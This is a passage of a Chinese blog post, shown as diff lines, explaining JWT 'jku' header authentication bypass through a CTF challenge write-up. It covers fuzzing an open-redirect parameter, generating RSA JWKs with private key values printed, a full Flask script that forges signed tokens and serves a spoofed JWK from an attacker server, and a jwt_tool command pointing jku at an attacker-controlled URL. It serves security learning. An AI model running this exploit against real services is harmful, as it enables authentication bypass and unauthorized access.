+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/cc1a02c9ac95a93a582dc.png" alt="cc1a02c9ac95a93a582dc" /></p>
+
+<p>但是这里的jku被白名单限定在了localhost域，无法直接修改jku指向我们自己的服务器</p>
+
+<p>再次回顾一下jku的利用手段</p>
+
+<ul>
+  <li>1.存在文件上传</li>
+  <li>2.存在重定向</li>
+  <li>3.存在CRLF注入</li>
+</ul>
+
+<h5 id="重定向利用">重定向利用</h5>
+
+<p>通过扫描目录可以发现/vul/redirect API</p>
+
+<p>直接访问会回显 bad params</p>
+
+<p>参数名我们是不知道的，所以需要fuzz API的参数，可以使用该字典：<a href="https://github.com/ptswarm/ptswarm-twitter/blob/main/2020-11-30-open-redirect-params.txt">2020-11-30-open-redirect-params.txt</a></p>
+
+<p>得到参数endpoint=</p>
+
+<p>重定向链接：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/vuln/redirect?endpoint=
+</code></pre></div></div>
+
+<h5 id="编写脚本">编写脚本</h5>
+
+<h5 id="生成jwk">生成JWK</h5>
+
+<p>使用python jscrypto库生成jwk</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">generate_key</span><span class="p">():</span>
+   <span class="n">key</span> <span class="o">=</span> <span class="n">jwk</span><span class="p">.</span><span class="n">JWK</span><span class="p">.</span><span class="nf">generate</span><span class="p">(</span><span class="n">kty</span><span class="o">=</span><span class="sh">'</span><span class="s">RSA</span><span class="sh">'</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">2048</span><span class="p">)</span>
+   <span class="nf">print</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">export_public</span><span class="p">())</span>
+   <span class="nf">print</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">export</span><span class="p">())</span>
+</code></pre></div></div>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"e"</span><span class="p">:</span><span class="s2">"AQAB"</span><span class="p">,</span><span class="nl">"kty"</span><span class="p">:</span><span class="s2">"RSA"</span><span class="p">,</span><span class="nl">"n"</span><span class="p">:</span><span class="s2">"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ"</span><span class="p">}</span><span class="w">
+
+</span><span class="p">{</span><span class="nl">"d"</span><span class="p">:</span><span class="s2">"VtSV6Qxo8qf7k1EXJMCIWs83IGCs-O_KVl0WM9yRylHU2caKgici1uZRrGapeqORHpzpyCVJEYA0gAfWfeDQqBO8LkaSzSPIfgaKGWoyObcSxQKKSIp_zNSQfgdRs1d1JqBRCOa_6nzblvC1Ggq_V1jzB9_jYVGOXiawQp-RzzCjRt6_BSr7Hg2xC0v_chwUt_yBhvDGz5x0rbspYcBL0OzI1hhZ1Tujk3MRrMfbIvBeoyRb_582UYQBc886SmAF6ue3eBc0v15mAX7qptCb7RLOVBYJwA-eYGktll9Orx-IIvy1GJpZdCV7FBGh-1AlCgM2O0KyBAwT3kRA1PYUgQ"</span><span class="p">,</span><span class="nl">"dp"</span><span class="p">:</span><span class="s2">"gu2vc9u13DNV1PUF0Zk5lliLQjzhsRqOwl9drbdUQ7JgkyVzfccZ8QhfrHVjgAFzD54I1zoNewXi-4jHts4O3ud1QOvt0tOJM-2OokFg29i0GoSXVT05IHb6VAmjAcfiC65SoS7sTm-V0oPp0DLswstGbk5zsAn2JL2RjBNYsz0"</span><span class="p">,</span><span class="nl">"dq"</span><span class="p">:</span><span class="s2">"MsgjIE3OYNQ6HtjjeBIJrG7eAAProYzqIvhNhBK4vfoEiA4V-1GPw2Gxn9xkvzdXFWRM0eih8Pu07-CgiqYGfkUSgkvmKynvr_oH8stZ-wKZMs9jsDsBuV0y6CQUKiFRTgWkNw3o6408XUwF5K46oAjtp0GUG-CNNNoIc45jN0E"</span><span class="p">,</span><span class="nl">"e"</span><span class="p">:</span><span class="s2">"AQAB"</span><span class="p">,</span><span class="nl">"kty"</span><span class="p">:</span><span class="s2">"RSA"</span><span class="p">,</span><span class="nl">"n"</span><span class="p">:</span><span class="s2">"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ"</span><span class="p">,</span><span class="nl">"p"</span><span class="p">:</span><span class="s2">"82Nu0AhRyqM1AMEOhR-Ld1s1FEDFYPaJlLTsyXeSsdJFERnKMAQ9FW49exwjNprvw5fgB7BkL5JtAO9b1OjIcz2SBZmP1OgED_69l-LrQ1xT_nczpiMeYvkv9Etdv1njK01jBRZEVudG4Qr1tiDI654Yr4dNIG8db3tdnk_WVqU"</span><span class="p">,</span><span class="nl">"q"</span><span class="p">:</span><span class="s2">"4Ncc9ZrEYMIrbc5MvK3ywpy8AvBTHET3hgJKlRYvrU8DHUYUbq4KZK6O4h1Xv3TrSxWEwn1Z7VmWJcybS9S2khmt32OF81eG9-aty0XZtxgulRe8wCi2KCzDmDZzJ0kCcchZUr3Chj8FeXOwdJH1G9ZQUiwgMZ0Fu0qQVi2ReqE"</span><span class="p">,</span><span class="nl">"qi"</span><span class="p">:</span><span class="s2">"RbZJiXGM4NBvyoBbEt0Eg1Sw22bEmQqpzYt16AcLjrpl_MTDGntuaOMhN7a3I4n3BoeaPytEy-I41UVLu0wyGYz91RtZWrFNvwd1R2TNvm5MfP5Xsr6hKSaDvAkvOZbg83VDXO2HeJ9ot6WwRZTKlivhLhJV-KxRX1hCbsv_VoU"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h5 id="生成jws">生成JWS</h5>
+
+<p>我们需要伪造jku，并且在JWS解密后的内容中附加上SSTI payload，比如``</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jku</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack</span><span class="sh">'</span> <span class="c1">#localhost:5002 its own server, 5001 server with vuln open redirect
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">jws</span><span class="p">.</span><span class="nc">JWK</span><span class="p">(</span><span class="o">**</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">all_key</span><span class="sh">'</span><span class="p">]))</span>
+<span class="n">jwstoken</span> <span class="o">=</span> <span class="n">jws</span><span class="p">.</span><span class="nc">JWS</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">jwstoken</span><span class="p">.</span><span class="nf">add_signature</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span><span class="n">alg</span><span class="o">=</span><span class="sh">'</span><span class="s">RS256</span><span class="sh">'</span><span class="p">,</span><span class="n">protected</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">header</span><span class="o">=</span><span class="nf">json_encode</span><span class="p">({</span><span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="p">:</span> <span class="n">key</span><span class="p">.</span><span class="nf">thumbprint</span><span class="p">(),</span> <span class="sh">'</span><span class="s">jku</span><span class="sh">'</span><span class="p">:</span><span class="n">jku</span><span class="p">,</span> <span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">RS256</span><span class="sh">"</span><span class="p">}))</span>
+<span class="n">sig</span> <span class="o">=</span> <span class="n">jwstoken</span><span class="p">.</span><span class="nf">serialize</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>jwk文档：<a href="https://jwcrypto.readthedocs.io/en/latest/jwk.html#json-web-key-jwk">JSON Web Key (JWK)</a></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">ka</span>
+<span class="o">&lt;</span><span class="n">jwcrypto</span><span class="p">.</span><span class="n">jwk</span><span class="p">.</span><span class="n">JWK</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f7cd6062400</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">jwstoken</span>
+<span class="o">&lt;</span><span class="n">jwcrypto</span><span class="p">.</span><span class="n">jws</span><span class="p">.</span><span class="n">JWS</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f7cd64ebdf0</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">jwstoken</span><span class="p">.</span><span class="nf">add_signature</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span><span class="n">alg</span><span class="o">=</span><span class="sh">'</span><span class="s">RS256</span><span class="sh">'</span><span class="p">,</span><span class="n">protected</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">header</span><span class="o">=</span><span class="nf">json_encode</span><span class="p">({</span><span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="p">:</span> <span class="n">ka</span><span class="p">.</span><span class="nf">thumbprint</span><span class="p">(),</span> <span class="sh">'</span><span class="s">jku</span><span class="sh">'</span><span class="p">:</span><span class="n">jku</span><span class="p">,</span> <span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">RS256</span><span class="sh">"</span><span class="p">}))</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">jwstoken</span><span class="p">.</span><span class="nf">serialize</span><span class="p">()</span>
+<span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">header</span><span class="sh">"</span><span class="s">:{</span><span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">RS256</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">jku</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">BYa3XpycMhDud1d-fYTijehS75jH90eTPxVYdUx8DqA</span><span class="sh">"</span><span class="s">},</span><span class="sh">"</span><span class="s">payload</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">e3tjb25maWd9fQ</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">signature</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">kwNzA48stR8tqbceOxHvHUyNCB9dzx02mPLRLpd9cjD5vzFio5rBMEIraLEp8WwLaH1T_Nofz7e2ToPCdWFS5nGv6jcGCJ9DrFMwL9vq4M6pfTLE7hKlGDtE7iFAIvZqL4MEAx7IdSC07zd4yTRNBy48q64yXEMqA8HigvETS14_DYfiDDkSkHNSxLTuItI8qOxhfLIj1UVTZMci1mi5PQ00R66q5RPFsy-6v6ZIrRjPkeODc4DIlzpv525NkREMcCrAgpb7XvrV1eVWJMWDwkZQoXf6XgJapvhRveegk9GYkLETbz3Lqwh13KNNZw9doVSqL1oyRhjxgDHyT1cQlg</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<h5 id="完整脚本">完整脚本：</h5>
+
+<p>使用flask构建web服务，访问/hack即返回伪造的JWK。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">send_from_directory</span>
+<span class="kn">from</span> <span class="n">jwcrypto</span> <span class="kn">import</span> <span class="n">jwk</span><span class="p">,</span> <span class="n">jws</span>
+<span class="kn">from</span> <span class="n">jwcrypto.common</span> <span class="kn">import</span> <span class="n">json_encode</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">re</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">pub_key</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">e</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">AQAB</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">kty</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">RSA</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">n</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ</span><span class="sh">"'</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">all_key</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">d</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">AaOagaGz7rNRsEvDwr6NjvY0RwC2zzow7dipjxWXazIncJK6n24SBa4CZ2sr6G2R34M3C9r1D0yC3p7_NtCsKFSzWQrueUCGDyT_gihhYOgqghGKmjWXFNkITUJYQ0LEOEuPlA8WVG-1N8IYERhhoKLaj2r-COYwIdVMZQXeEiinXLfCVJCEtMMVNBMRfyUoY4_siQ6vMQGxJsHn8XOE2zsMnkreG7kPE-c0UrmsdnhmmyNFtegbS8dej4eH0Xy1txg81wTQSyGUru10QaFYVVAOhRFmdVNvSNWW3uL1guAOgLg8Y17FPnz1FiUGhflTeEsWwcKlVWl7QF0Bel-e1Q</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">dp</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">nAk_O5Qi5HQRhgcsNZsGgFeEeErPn5CoXFx1DhANVbQwuNU-19P29wR4gSaDfexoLLaDXrw50g-ufmCLbz9r461LcPdmD6g9okstgPF38heLhjyTuA84xDu16sCX0ltpxWOWzhRkBeI0uhE1mjXtD7Uk9KUX5Y5SQK6MPZmVsoM</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">dq</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">MznXQhv8h65iqwxzfPj3QwK6s9JvIR4IHnur2t3GYaCd-RG5fGSigkClUeG8TUlxViOr5ElbGsATWOzqAlr_CwTPCwEg9lcL5AKEHOy94k5CfAWMr1csa6Pp6bQJkveDf_c87s2Z1zYn6cJmJZiEJADocRyyUJ_mnh6wpvS7tgs</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">e</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">AQAB</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">kty</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">RSA</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">n</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">p</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">0-jzleXm-XbQe_gjrKqFsQUypSjtVX2NJ1ckF5op0qE1XiLETHg0C-woMuEymyW-vqRAbgA5yx4pVhlmJTPkv8TVsc9OYsz1H1cswiI-I73uLJ1wgUk_4mapa7K10Mrsw2X9AZpmiP7ntc4OwVdJ7BjUoY587IbZrV0yVCKgeYM</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">q</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">wWXeDP796mxedqUActwBTCQCR3uNjbmOINMZY2CR0DuxCa9AX8V3VZEQVUj1Q6R8o4ixrQywQy1R902Kc9dCQqBkwF4WfybzhkfwiVcf8Yy3bqZzEoGCEbs2KVnYX7J3EBIfgEQVXb_G5ZeOvWzgSTi11e1_kdcUXdANiGtISdc</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">qi</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">MNo8DyDds5N6gw6gmA17Iu0scH5i2n30oS0nDxFp0tKqfd5WAjF7J3P_uESwzW8AvncAm7HtDBd-KEHipcOcm7rPEdfBKKhyo3Q25chBCvRPvVcslmML30p3p0_F26yd5ThHWoo3UmHNoPLiMNZN3oRsCe1w2jity3YVvZDhu48</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span>
+
+<span class="k">def</span> <span class="nf">generate_key</span><span class="p">():</span>
+   <span class="n">key</span> <span class="o">=</span> <span class="n">jwk</span><span class="p">.</span><span class="n">JWK</span><span class="p">.</span><span class="nf">generate</span><span class="p">(</span><span class="n">kty</span><span class="o">=</span><span class="sh">'</span><span class="s">RSA</span><span class="sh">'</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">2048</span><span class="p">)</span>
+   <span class="nf">print</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">export_public</span><span class="p">())</span>
+   <span class="nf">print</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">export</span><span class="p">())</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span> <span class="c1">#to get evil jws token
+</span><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+   <span class="n">jku</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack</span><span class="sh">'</span> <span class="c1">#localhost:5002 its own server, 5001 server with vuln open redirect
+</span>   <span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
+   <span class="n">key</span> <span class="o">=</span> <span class="n">jws</span><span class="p">.</span><span class="nc">JWK</span><span class="p">(</span><span class="o">**</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">all_key</span><span class="sh">'</span><span class="p">]))</span>
+   <span class="n">jwstoken</span> <span class="o">=</span> <span class="n">jws</span><span class="p">.</span><span class="nc">JWS</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
+   <span class="n">jwstoken</span><span class="p">.</span><span class="nf">add_signature</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span><span class="n">alg</span><span class="o">=</span><span class="sh">'</span><span class="s">RS256</span><span class="sh">'</span><span class="p">,</span><span class="n">protected</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">header</span><span class="o">=</span><span class="nf">json_encode</span><span class="p">({</span><span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="p">:</span> <span class="n">key</span><span class="p">.</span><span class="nf">thumbprint</span><span class="p">(),</span> <span class="sh">'</span><span class="s">jku</span><span class="sh">'</span><span class="p">:</span><span class="n">jku</span><span class="p">,</span> <span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">RS256</span><span class="sh">"</span><span class="p">}))</span>
+   <span class="n">sig</span> <span class="o">=</span> <span class="n">jwstoken</span><span class="p">.</span><span class="nf">serialize</span><span class="p">()</span>
+   <span class="k">return</span> <span class="n">sig</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/hack</span><span class="sh">'</span><span class="p">)</span> <span class="c1">#to redirect, return evil JWK
+</span><span class="k">def</span> <span class="nf">hack</span><span class="p">():</span> <span class="c1">#need send as file
+</span>   <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">tmp.file</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">file_write</span><span class="p">:</span>
+       <span class="n">file_write</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">jwk</span><span class="p">.</span><span class="nc">JWK</span><span class="p">(</span><span class="o">**</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">all_key</span><span class="sh">'</span><span class="p">])).</span><span class="nf">export_public</span><span class="p">())</span>
+   <span class="n">uploads</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">)))</span>
+   <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">directory</span><span class="o">=</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span><span class="n">filename</span><span class="o">=</span><span class="sh">'</span><span class="s">tmp.file</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/get_flag</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+   <span class="n">payload</span> <span class="o">=</span> <span class="nf">index</span><span class="p">()</span>
+   <span class="n">answ</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://localhost:5000/jws_check</span><span class="sh">'</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">payloads</span><span class="sh">'</span><span class="p">:</span><span class="n">payload</span><span class="p">}).</span><span class="n">text</span>
+   <span class="n">flag</span> <span class="o">=</span> <span class="n">answ</span>
+   <span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">'</span><span class="s">VolgaCTF{.+?}</span><span class="sh">'</span><span class="p">,</span> <span class="n">answ</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+   <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+   <span class="k">return</span> <span class="n">flag</span>
+   
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+   <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">5002</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="0x05-相关工具">0x05 相关工具</h2>
+
+<h3 id="jwt_tool"><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></h3>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/100555535-18598280-3294-11eb-80ed-ca5a0c3455d6.png" alt="标识" /></p>
+
+<p><strong>其目前的功能包括：</strong></p>
+
+<blockquote>
+  <ul>
+    <li>检查令牌的有效性</li>
+    <li>测试已知漏洞：
+      <ul>
+        <li>（CVE-2015-2951）<strong><em>alg=none</em></strong>签名绕过漏洞</li>
+        <li>（CVE-2016-10555）<strong><em>RS / HS256</em></strong>公钥不匹配漏洞</li>
+        <li>（CVE-2018-0114）<strong><em>Key injection</em></strong>漏洞</li>
+        <li>（CVE-2019-20933 / CVE-2020-28637）<strong><em>Blank password</em></strong> 漏洞</li>
+        <li>（CVE-2020-28042） <strong><em>Null signature</em></strong>漏洞</li>
+      </ul>
+    </li>
+    <li>扫描配置错误或已知漏洞</li>
+    <li>Fuzz声明值以引发意外行为</li>
+    <li>测试secret/key file/public key/ JWKS key的有效性</li>
+    <li>通过高速<em>字典攻击</em>识别<em>低强度key</em></li>
+    <li>伪造新的令牌头和有效载荷内容，并使用<strong>密钥</strong>或通过其他攻击方法创建新的签名</li>
+    <li>时间戳篡改</li>
+    <li>RSA和ECDSA密钥生成和重建（来自JWKS文件）</li>
+  </ul>
+</blockquote>
+
+<p>jwt_tools非常强大，文档：<a href="https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool">Using jwt_tool</a></p>
+
+<p>其中关于jku攻击的部分如下：</p>
+
+<blockquote>
+  <p>欺骗远程JWKS：使用首次运行时自动生成的RSA密钥，并通过提供的URL（-ju）提供JWKS-或将该URL添加到您的jwtconf.ini配置文件中-并使用私钥对令牌进行签名：</p>
+</blockquote>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 jwt_tool.py JWT_HERE <span class="nt">-X</span> s <span class="nt">-ju</span> http://example.com/my_jwks.json
+</code></pre></div></div>
+
+<h3 id="myjwt"><a href="https://github.com/mBouamama/MyJWT">MyJWT</a></h3>
+
+<p>同样强大的jwt工具，文档：<a href="https://myjwt.readthedocs.io/en/latest/">MyJWT: crack Your jwt</a></p>
+
+<blockquote>
+  <p><strong>Features</strong></p>
+  <ul>
+    <li>copy new jwt to clipboard</li>
+    <li>user Interface (thanks <a href="https://github.com/tmbo/questionary">questionary</a>)</li>
+    <li>color output</li>
+    <li>modify jwt (header/Payload)</li>
+    <li>None Vulnerability</li>
+    <li>RSA/HMAC confusion</li>
+    <li>Sign a jwt with key</li>
+    <li>Brute Force to guess key</li>
+    <li>crack jwt with regex to guess key</li>
+    <li>kid injection</li>
+    <li><em>Jku Bypass</em></li>
+    <li><em>X5u Bypass</em></li>
+  </ul>
+</blockquote>
+
+<p>2020年11月添加了对jku与x5u利用的功能。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">--jku</span> TEXT                   Jku Header to bypass authentication
+  <span class="nt">--x5u</span> TEXT                   X5u Header to bypass authentication
+</code></pre></div></div>
+
+<h3 id="jwt_attack_with_header_injectionpy"><a href="https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f">jwt_attack_with_header_injection.py</a></h3>
+
+<p>用于利用CRLF漏洞的脚本</p>
+
+<h2 id="0x06-总结">0x06 总结</h2>
+
+<p>总结一下jku权限绕过的利用方式：</p>
+
+<p>1.jku可以直接指向为攻击者服务器</p>
+<ul>
+  <li>1.直接在服务器上放置JWK，jku指向攻击者服务器</li>
+</ul>
+
+<p>2.jku有白名单或者别的过滤措施</p>
+<ul>
+  <li>1.配合文件上传漏洞，上传构造好的JWK，jku指向该JWK</li>
+  <li>2.配合开放重定向，直接重定向到攻击者的服务器，服务器上放置构造好的JWK</li>
+  <li>3.配合CRLF漏洞，直接控制JWK内容</li>
+</ul>
+
+<h1 id="参考资料">参考资料</h1>
+
